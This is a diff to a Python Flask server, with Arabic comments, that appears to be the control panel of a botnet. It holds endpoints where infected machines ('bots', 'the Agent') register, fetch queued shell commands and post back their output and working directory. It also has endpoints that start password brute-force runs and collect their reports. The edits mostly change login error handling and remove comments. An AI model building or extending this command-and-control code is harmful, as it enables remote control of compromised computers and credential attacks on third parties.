@@ -38,7 +38,10 @@ def login_required(f):
     @functools.wraps(f)
     def decorated(*args, **kwargs):
         if 'logged_in' not in session or not session['logged_in']:
-            return jsonify({"error": "Unauthorized"}), 401
+            # إذا كان الطلب من CLI، نرد بـ JSON بدلاً من إعادة التوجيه
+            if request.headers.get('X-Requested-With') == 'CLI':
+                return jsonify({"status": "error", "message": "Unauthorized"}), 401
+            return redirect(url_for('login'))
         return f(*args, **kwargs)
     return decorated
 
@@ -58,18 +61,16 @@ def login():
 
         remaining = get_remaining_lockout(ip)
         if remaining > 0:
-            return jsonify({"error": f"Locked. Wait {int(remaining//60)} min"}), 403
+            return render_template('login.html', error=f"Locked. Wait {int(remaining//60)} min"), 403
 
         if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
-            return jsonify({"error": "Invalid username"}), 400
+            return render_template('login.html', error="Invalid username"), 400
 
         password_hash = hashlib.sha256(password.encode()).hexdigest()
         if username == USERNAME and password_hash == PASSWORD_HASH:
             failed_attempts.pop(ip, None)
             session['logged_in'] = True
             session['username'] = username
-            if request.headers.get('X-Requested-With') == 'CLI':
-                return jsonify({"status": "ok", "message": "Authenticated"})
             return redirect(url_for('dashboard'))
         else:
             record = failed_attempts.get(ip, {"attempts": 0, "locked_until": None})
@@ -83,9 +84,9 @@ def login():
             msg = f"Invalid. Attempts left: {max(0, 5 - (attempts % 5))}"
             if remaining > 0:
                 msg = f"Locked. Wait {int(remaining//60)} min"
-            return jsonify({"error": msg}), 401
+            return render_template('login.html', error=msg), 401
 
-    return render_template('login.html')
+    return render_template('login.html', error=None)
 
 @app.route('/logout')
 def logout():
@@ -164,7 +165,9 @@ bruteforce_data = {
     "stop_requested": False
 }
 
-# ===== APIs للـ CLI =====
+# ======================================================================
+# 🔥 واجهات API لـ CLI (هذا هو الجزء المفقود الذي يسبب الخطأ)
+# ======================================================================
 
 # 1. تسجيل الدخول للـ CLI
 @app.route('/api/cli/login', methods=['POST'])
@@ -265,14 +268,13 @@ def cli_bruteforce_start():
 
     return jsonify({"status": "started", "total": len(passwords)})
 
-# ===== باقي APIs =====
+# ===== باقي APIs (للاتصال مع الـ Agent) =====
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
     bot_id = data.get('id')
     if bot_id:
         bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
-        # نعطي ID جديد (4 أرقام)
         new_id = get_next_bot_id()
         bots[new_id] = {
             'ip': request.remote_addr,
@@ -287,14 +289,10 @@ def register():
 
 @app.route('/get_task', methods=['GET'])
 def get_task():
-    # نبحث عن أي bot ID (نستخدم المعرف المرسل من الـ Agent)
-    # الـ Agent القديم كايستخدم socket.gethostname()...
-    # ولكن الآن سيرسل الـ ID الجديد (4 أرقام) بعد التحديث.
     bot_id = request.args.get('id')
     if not bot_id:
         return jsonify({"command": ""})
 
-    # نبحث في المهام
     if bot_id in tasks and len(tasks[bot_id]) > 0:
         cmd = tasks[bot_id].pop(0)
         return jsonify({"command": json.dumps(cmd)})
@@ -313,7 +311,6 @@ def send_result():
         if new_cwd:
             bots[bot_id]['cwd'] = new_cwd
         # نبحث عن task_id في النتيجة
-        # نستخدم task_id لتحديث النتيجة
         try:
             result_data = json.loads(output)
             task_id = result_data.get('task_id')
@@ -363,7 +360,6 @@ def get_result():
         return jsonify({"output": out})
     return jsonify({"output": ""})
 
-# ===== Brute Force Report =====
 @app.route('/bruteforce/report', methods=['POST'])
 def bruteforce_report():
     data = request.json
